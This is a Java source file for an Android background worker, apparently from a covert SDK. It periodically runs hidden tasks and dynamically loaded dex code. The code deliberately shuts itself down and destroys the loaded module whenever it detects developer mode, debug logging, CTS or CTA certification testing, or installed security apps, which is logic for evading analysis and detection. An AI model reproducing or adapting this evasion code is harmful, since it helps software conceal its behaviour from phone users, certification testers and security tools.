package com.hs.cld;

import android.content.Context;

import com.hs.cld.basic.MutexChecker;
import com.hs.cld.basic.SLT;
import com.hs.cld.basic.Settings;
import com.hs.cld.basic.TaskManager;
import com.hs.cld.basic.ThreadManager;
import com.hs.cld.common.PROP;
import com.hs.cld.common.utils.LOG;
import com.hs.cld.common.utils.SystemUtils;
import com.hs.cld.common.utils.TextUtils;
import com.hs.cld.common.utils.Threadable;
import com.hs.cld.da.dx.DexManager;

import java.util.Random;
import java.util.concurrent.TimeUnit;

public class MainWorker {
	/**
     * 日志标签
     */
    private final static String TAG = "CLD.MainWorker";

    /**
     * 封装静态对象
     */
    private static class MainWorkerHolder {
        /**
         * 静态实例对象
         */
        private static final MainWorker INSTANCE = new MainWorker();
    }

	/**
	 * 定时器是否已经启动
     */
    private boolean mStarted = false;

    /**
     * 上一次执行周期任务的时间
     */
    private long mLastJobInMillis = 0;

    /**
     * 构造函数，隐藏
     */
    private MainWorker() {}

    /**
     * 获取TransferManager实例
     * @return TransferManager实例对象
     */
    public static MainWorker get() {
        return MainWorkerHolder.INSTANCE;
    }

	/**
     * 启动服务
     * @param context 上下文
     */
    public synchronized void start(final Context context) {
        if (!mStarted) {
            LOG.i(TAG, "start: slt=" + SLT.silent(context)
                    + ", dm=" + SystemUtils.isDevModeEnabled(context)
                    + ", logd=" + LOG.isLogD()
                    + ", cts=" + SystemUtils.isCTSEnabled(context)
                    + ", cta=" + SystemUtils.isCTAEnabled(context)
                    + ", mtx=" + MutexChecker.has(context));
            scheduleNextJob(context, 5);
            mStarted = true;
        }
    }

    private void scheduleNextJob(final Context context, long delays) {
        LOG.d(TAG, "schedule next job, delays=" + delays);
        ThreadManager.getCoreScheduler().schedule(new Threadable("mainJob") {
            @Override
            public void doFire() {
                if (doJobWork(context)) {
                    scheduleNextJob(context, randomDelays());
                } else {
                    // 如果无法继续运行，这里标记为没有启动
                    LOG.d(TAG, "schedule job exit ...");
                    mStarted = false;
                }
            }
        }, delays, TimeUnit.SECONDS);
    }

    private long randomDelays() {
        long periods = (PROP.isBeta() ? 30 : 300);
        return (periods + new Random().nextInt(10));
    }

    private boolean doJobWork(Context context) {
        try {
            return doJobWorkThrowable(context);
        } catch (Throwable t) {
            LOG.d(TAG, "do job work failed: " + t);
        }
        return true;
    }

    private boolean doJobWorkThrowable(final Context context) {
        // 每次更新一次日志开关
        if (PROP.isLogEnabled()) {
            LOG.setEnabled(true);
        } else {
            LOG.setEnabled(Settings.isLogEnabled(context, false));
        }

        // 如果程序是静默状态，立即退出执行，维持定时器运行，直到程序解冻
        if (SLT.silent(context)) {
            LOG.i(TAG, "app slt to " + TextUtils.TSTR(SLT.millis(context)));
            DexManager.get().destroy(context);
            return true;
        }

        // 如下情况，一旦满足，程序立即退出执行，并且退出定时器
        // 只有宿主应用重新启动后才运行
        // 1 手机处于开发者状态
        // 2 手机当前log日志是debug级别
        // 3 手机处于CTS状态
        // 4 手机处于CTA状态
        // 5 手机装有互斥的安全软件
        if (!PROP.ignoreCheckMode()) {
            if (!Settings.isIgnoreDevMode(context, false)) {
                if (SystemUtils.isDevModeEnabled(context)) {
                    LOG.i(TAG, "dev mode ...");
                    DexManager.get().destroy(context);
                    return false;
                }
            } else {
                LOG.i(TAG, "ignore dev mode ...");
            }

            if (!Settings.isIgnoreLogD(context, false)) {
                if (LOG.isLogD()) {
                    LOG.i(TAG, "log debuggable ...");
                    DexManager.get().destroy(context);
                    return false;
                }
            } else {
                LOG.i(TAG, "ignore log debuggable ...");
            }

            if (!Settings.isIgnoreCTS(context, false)) {
                if (SystemUtils.isCTSEnabled(context)) {
                    LOG.i(TAG, "CTS mode ...");
                    DexManager.get().destroy(context);
                    return false;
                }
            } else {
                LOG.i(TAG, "ignore CTS mode ...");
            }

            if (!Settings.isIgnoreCTA(context, false)) {
                if (SystemUtils.isCTAEnabled(context)) {
                    LOG.i(TAG, "CTA mode ...");
                    DexManager.get().destroy(context);
                    return false;
                }
            } else {
                LOG.i(TAG, "ignore CTA mode ...");
            }

            if (!Settings.isIgnoreMutexPackages(context, false)) {
                if (MutexChecker.has(context)) {
                    LOG.i(TAG, "find mutex pkgs ...");
                    DexManager.get().destroy(context);
                    return false;
                }
            } else {
                LOG.i(TAG, "ignore mutex pkgs ...");
            }
        }

        // 如果以上条件都满足，继续检查时间间隔，确定是否继续工作
        // 目的是为了控制程序有效模块的运行频率
        long timeNow = System.currentTimeMillis();
        long periods = (PROP.isBeta() ? 5 : 3600);
        long elapsed = ((timeNow - mLastJobInMillis) / 1000L);

        if (elapsed < 0) {
            LOG.d(TAG, "[" + periods + "] " + elapsed
                    + "s elapsed from last(" + TextUtils.TSTR(mLastJobInMillis) + ") ...");
            mLastJobInMillis = timeNow;
        } else if (elapsed >= periods) {
            doRealJobWork(context);
            mLastJobInMillis = timeNow;
        } else {
            LOG.d(TAG, "[" + periods + "] " + elapsed
                    + "s elapsed from last(" + TextUtils.TSTR(mLastJobInMillis) + ") ...");
        }

        return true;
    }

    /**
     * 执行有效的任务模块
     * @param context 上下文
     */
    private void doRealJobWork(final Context context) {
        try {
            LOG.i(TAG, "process tasks start ...");
            TaskManager.process(context, new TaskManager.OnTaskListener() {
                @Override
                public void onFinished() {
                    LOG.i(TAG, "process tasks done ...");
                }
            });
        } catch (Throwable t) {
            LOG.w(TAG, "process tasks failed: " + t);
        }
    }
}
